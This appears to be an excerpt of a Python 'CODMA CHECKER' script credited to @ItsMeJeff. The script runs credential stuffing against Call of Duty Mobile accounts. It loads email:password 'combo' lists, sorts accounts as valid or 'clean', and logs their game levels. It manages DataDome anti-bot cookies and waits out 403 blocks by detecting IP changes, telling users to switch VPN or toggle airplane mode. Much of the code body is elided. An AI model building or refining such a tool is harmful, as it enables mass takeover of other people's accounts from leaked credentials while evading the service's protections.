...
# ================================
# 🎨 Termux Theme (grayish background)
# ================================
def setup_termux_theme():
    """Set a smooth grayish-purple background for Termux."""
    # Check if we are inside Termux
    if not (os.getenv("TERMUX_VERSION") or os.getenv("ANDROID_ROOT")):
        return  # Not Termux, skip
...
"""
    ...
    # Write theme only if it doesn't already match
    try:
        ...
        if not os.path.exists(config_path) or open(config_path).read() != desired_theme:
            ...
            print(Fore.GREEN + "✅ Termux theme set to grayish background" + Style.RESET_ALL)
...
# ================================
# 🎨 Console & Emojis (no background colors)
# ================================
console = Console()
...
# ================================
# 🌈 Rainbow Banner (no background)
# ================================
def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    banner_text = "CODMA CHECKER"
...
def signal_handler(signum, frame):
    ...
    print(f"  {Fore.WHITE}{EMOJI['crown']}   Thanks for using my CODМ checker! - @ItsMeJeff{Style.RESET_ALL}")
...
# ================================
# 🎨 Color & Logging Setup (no backgrounds)
# ================================
class Colors:
...
# ================================
# 🍪 Cookie & DataDome Managers (unchanged)
# ================================
class CookieManager:
    def __init__(self):
...
class DataDomeManager:
    ...
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=300):
        ...
        while time.time() - start_time < max_wait_time:
            ...
            if current_ip and current_ip != original_ip:
                ...
                logger.info(f"{EMOJI['fire']} 🎉 IP changed successfully after {attempts} checks!")
                if self.fetch_fresh_datadome_with_retry(session): return True
                else: return False
            else:
                if attempts % 5 == 0: logger.info(f"{EMOJI['info']} 🔍 IP check {attempts}: Still {original_ip} → Auto-retrying...")
    ...
    def handle_403(self, session):
        ...
        logger.error(f"{EMOJI['error']} 🚫 403 Blocked - Attempt {self._403_attempts}/3")
        if self._403_attempts >= 3:
            self._blocked = True
            logger.error(f"{EMOJI['error']} 🚫 IP blocked after 3 attempts")
            logger.error(f"{EMOJI['info']} 💡 Network fix: WiFi → Use VPN | Mobile Data → Toggle Airplane Mode")
            logger.info(f"{EMOJI['refresh']} 🔄 Auto-detecting IP change and fetching fresh cookies...")
            if self.wait_for_ip_change(session):
                logger.info(f"{EMOJI['success']} ✅ Successfully recovered from rate limit!")
                self._403_attempts = 0; self._blocked = False
                return True
            else: return False
        else:
            logger.info(f"{EMOJI['refresh']} 🔄 Attempting to fetch fresh DataDome cookie...")
            if self.fetch_fresh_datadome_with_retry(session, max_retries=3): return True
        return False
...
class LiveStats:
    ...
    def should_display(self):
        with self.lock: return self.check_count % 10 == 0

    def display_stats(self):
        stats = self.get_stats()
        return (
            f"{EMOJI['chart']} [bold cyan][LIVE STATS][/bold cyan] "
            f"{EMOJI['success']} VALID [{stats['valid']}] | {EMOJI['error']} INVALID [{stats['invalid']}] | "
            f"{EMOJI['check']} CLEAN [{stats['clean']}] | {EMOJI['cross']} NOT CLEAN [{stats['not_clean']}] | "
            f"{EMOJI['game']} CODM [{stats['has_codm']}] | "
            f"{EMOJI['crown']} HIGHEST CLEAN LVL [{stats['highest_clean_level']}] | HIGHEST LVL [{stats['highest_level']}] "
            f"-> config @ItsMeJeff"
        )
    ...
    def display_final_summary(self):
        ...
        console.print()
        console.print(Panel(f"{EMOJI['folder']} [bold green]All results saved in:[/bold green] [cyan]results/[/cyan]\n{EMOJI['crown']} [bold magenta]Created by @ItsMeJeff[/bold magenta]", border_style="green", box=ROUNDED))
        console.print("\n")
...
def fetch_codm_player_details(session, uid):
    """Placeholder for ban status (no last play)."""
    return {"banned": False}
...
# ================================
# 🖨️ DISPLAY with arrows per line
# ================================
def display_codm_info(account_details, codm_info, leak_info=None):
    """Display account information with arrow prefix on each line."""
    ...
    lines.append(f"{arrow}{Fore.MAGENTA}💪 POWERED BY @ItsMeJeff{Style.RESET_ALL}")
    lines.append(f"{arrow}{Fore.CYAN}════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
...
def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results'):
    try:
        ...
        if datadome_manager.is_blocked():
            logger.warning(f"{EMOJI['warning']} Skipping {account} - IP blocked, waiting for auto IP change...")
            return "RATE_LIMITED"
...
def select_input_file():
    """Redesigned file selector with arrow prefixes and smoother Termux background."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")
    
    console.print()
    header = Panel(Align.center(Text(f"{EMOJI['folder']} FILE SELECTOR", style="bold cyan")), border_style="cyan", box=ROUNDED, width=60)
    console.print(header)
    console.print()
    
    show_instructions = Confirm.ask(f"{EMOJI['info']} [bold cyan]📖 Show instructions?[/bold cyan]", default=False)
    if show_instructions:
        console.print(Panel(f"{EMOJI['gear']} [bold yellow]⚡ QUICK GUIDE[/bold yellow]\n\n{EMOJI['cookie']} [cyan]🔹[/cyan] Auto-generated cookies from fresh_cookies.txt\n{EMOJI['refresh']} [cyan]🔹[/cyan] Use RESERVE_FRESH_COOKIE.TXT as backup\n{EMOJI['key']} [cyan]🔹[/cyan] Rename reserve file to fresh_cookies.txt when needed\n{EMOJI['ip']} [cyan]🔹[/cyan] IP blocked? Change IP + cookies immediately\n{EMOJI['banned']} [cyan]🔹[/cyan] Blocked 2-3 times? Delete fresh_cookies.txt and use reserve", border_style="yellow", box=ROUNDED, title=f"{EMOJI['info']} Instructions"))
        console.print()
    
    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder, exist_ok=True)
        console.print(Panel(f"{EMOJI['success']} [bold green]✅ Combo folder created![/bold green]\n\n{EMOJI['warning']} ⚠️  Add your .txt files to the Combo folder and restart", border_style="green", title="Setup Complete"))
        exit(0)
    ...
    file_path = None
    if txt_files:
        console.print(f"{EMOJI['success']} [bold green]✨ Found {len(txt_files)} file(s)[/bold green]\n")
        # Build list with arrows
        for i, file in enumerate(txt_files, 1):
            full = os.path.join(combo_folder, file)
            size = os.path.getsize(full)/1024
            try:
                with open(full,'r',encoding='utf-8') as f: lines = sum(1 for line in f if line.strip())
            except: lines=0
            size_disp = f"{size/1024:.1f} MB" if size>=1000 else f"{size:.1f} KB"
            console.print(f"  {Fore.CYAN}➜ {i}.{Style.RESET_ALL} {Fore.WHITE}{file}{Style.RESET_ALL} {Fore.GREEN}({size_disp}, {lines} lines){Style.RESET_ALL}")
        console.print()
        while True:
            try:
                choice = Prompt.ask(f"{EMOJI['target']} [bold cyan]🎯 Select file number (or press Enter for auto-detect)[/bold cyan]", default="").strip()
                if not choice:
                ...
                if 0 <= idx < len(txt_files):
                    ...
                    console.print(Panel(f"{EMOJI['success']} [bold green]✅ Selected:[/bold green] [cyan]{txt_files[idx]}[/cyan]", border_style="green", box=ROUNDED))
                    break
                else:
                    console.print(f"{EMOJI['error']} [bold red]❌ Invalid choice. Pick 1-{len(txt_files)}[/bold red]")
            except ValueError:
                console.print(f"{EMOJI['error']} [bold red]❌ Enter a valid number[/bold red]")
    else:
        console.print(Panel(f"{EMOJI['warning']} [bold yellow]⚠️  No .txt files found in Combo folder[/bold yellow]\n\n[white]Add files to:[/white] [cyan]Combo/[/cyan]", border_style="yellow", title="No Files"))
        file_path = Prompt.ask(f"{EMOJI['folder']} [cyan]📁 Enter file path (or press Enter to auto-search)[/cyan]").strip()
        if not file_path:
...
def main():
    global account_counter, counter_lock, live_stats_global
    ...
    while account_index < len(accounts) or retry_queue:
        ...
        if datadome_manager.is_blocked():
            original_ip = datadome_manager.get_current_ip()
            console.print(Panel(f"{EMOJI['pause']} [bold yellow]⏸️  CHECKER PAUSED[/bold yellow]\n\n{EMOJI['error']} [red]Rate limit detected - IP change required[/red]\n\n{EMOJI['refresh']} [cyan]Auto-detecting IP change...[/cyan]\n{EMOJI['ip']} [white]Original IP:[/white] [yellow]{original_ip or 'Unknown'}[/yellow]\n{EMOJI['hourglass']} [dim]Checking every 5 seconds (max 5 minutes)...[/dim]", title=f"{EMOJI['warning']} Rate Limited", border_style="yellow", width=80))
            start = time.time()
            ip_changed = False
            while time.time()-start < 300:
                if shutdown_event.is_set(): break
                curr = datadome_manager.get_current_ip()
                if curr and original_ip and curr != original_ip:
                    console.print(Panel(f"{EMOJI['success']} [bold green]✅ IP CHANGE DETECTED![/bold green]\n{EMOJI['ip']} New IP: {curr}", border_style="green", width=80))
                    ip_changed = True
                    break
                time.sleep(5)
            if ip_changed:
                if datadome_manager.fetch_fresh_datadome_with_retry(session):
                    ...
                    datadome_manager._blocked = False
                    continue
            else:
                console.print(Panel(f"{EMOJI['error']} [bold red]❌ IP change timeout[/bold red]\nPress Enter to retry, Ctrl+C to exit", border_style="red", width=80))
                try: input()
...
def process_account_wrapper(account_line, session, cookie_manager, datadome_manager, live_stats, result_folder, filename, AUTO_REMOVE_CHECKED):
    ...
    try:
        ...
        print(f"\n  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}\n")
        if live_stats.should_display(): print(f"{live_stats.display_stats()}", flush=True)
